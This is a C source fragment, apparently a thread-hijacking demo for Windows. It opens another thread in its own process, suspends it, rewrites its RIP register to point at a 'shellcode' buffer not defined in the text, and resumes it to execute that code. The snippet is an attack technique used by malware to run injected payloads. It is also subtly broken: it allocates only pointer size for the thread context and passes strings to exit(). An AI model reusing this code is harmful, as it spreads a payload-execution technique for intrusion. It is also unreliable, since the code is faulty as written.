int main() {
	PTHREADENTRY32	pThread				= (PTHREADENTRY32)malloc(sizeof(THREADENTRY32));
	HANDLE			hSnapshot			= 0,
					hHijackedThread		= 0;
	DWORD			dwCurrentProcessId	= GetCurrentProcessId(),
					dwCurrentThreadId	= GetCurrentThreadId();
	PCONTEXT		pThreadcontext      = (PCONTEXT)malloc(sizeof(PCONTEXT));

	pThread->dwSize = sizeof(THREADENTRY32);

	/* Get a snapshot of all threads running on the system */
	if ( (hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)) == NULL ) {
		exit("Couldn't get a handle to snapshot.");
	}

	/* Enumerate the first thread */
	if ( !Thread32First(hSnapshot, pThread) ) {
		exit("Could not get information about the first thread.");
	}

	/* Enumerate each thread on the system. Open a handle to a thread in this process which isn't this thread */
	do {
		if ( pThread->th32OwnerProcessID == dwCurrentProcessId && pThread->th32ThreadID != dwCurrentThreadId ) {
			if ( (hHijackedThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | SYNCHRONIZE, FALSE, pThread->th32ThreadID)) == NULL ) {
				exit("Couldn't get a handle to the thread");
			}
			printf("Opened a handle to thread id %d in this process\n", pThread->th32ThreadID);
			break;
		}
	} while ( Thread32Next(hSnapshot, pThread) );

	if ( !hHijackedThread ) {
		exit("A handle to a thread in this process is not available.");
	}

	/* Suspend the thread */
	if ( (SuspendThread(hHijackedThread)) == -1 ) {
		CloseHandle(hHijackedThread);
		exit("Couldn't suspend the thread.");
	}

	pThreadcontext->ContextFlags = CONTEXT_CONTROL;

	/* Acquire the thread context, point RIP at the shellcode & re-apply the context to the thread */
	if ( !GetThreadContext(hHijackedThread, pThreadcontext) ) {
		CloseHandle(hHijackedThread);
		exit("Couldn't populate the context structure with info from thread id %d.", pThread->th32ThreadID);
	}

	pThreadcontext->Rip = (DWORD64)shellcode;

	if ( !SetThreadContext(hHijackedThread, pThreadcontext) ) {
		CloseHandle(hHijackedThread);
		exit("Couldn't update the thread (%d) with the next context information.", pThread->th32ThreadID);
	}
	
	printf("Set RIP in thread to 0x%p. Resuming thread...\n", shellcode);

	/* Resume thread to execute the shellcode, wait for shellcode to finish execution */
	if ( (ResumeThread(hHijackedThread)) == -1 ) {
		CloseHandle(hHijackedThread);
	}

	printf("Thread resumed successfully. Awaiting shellcode execution...\n");

	WaitForSingleObject(hHijackedThread, INFINITE);

	CloseHandle(hHijackedThread);

	return 0;
}